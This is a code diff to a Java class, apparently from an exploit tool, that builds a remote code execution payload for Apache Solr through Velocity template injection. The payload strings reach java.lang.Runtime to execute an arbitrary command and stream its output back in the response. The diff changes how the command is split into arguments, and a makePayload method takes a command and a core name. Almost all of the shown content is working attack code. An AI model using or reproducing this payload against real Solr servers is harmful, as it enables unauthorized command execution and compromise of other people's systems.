@@ -28,12 +28,11 @@ public class SolrHttpRequestBuilder {
             "}";
 
     private static final String payloadBefore =
-            "q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))" +
-            "+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23" +
-            "set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27";
+            "q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23" +
+                    "set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))" +
+                    "+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec($str.valueOf(%27";
 
-    public static final String payloadAfter = "%27))" +
-            "+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end";
+    public static final String payloadAfter = "%27).split(%22,%22)))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end";
 
 
     public static String makePayload(String cmd,String core,boolean isEncode){
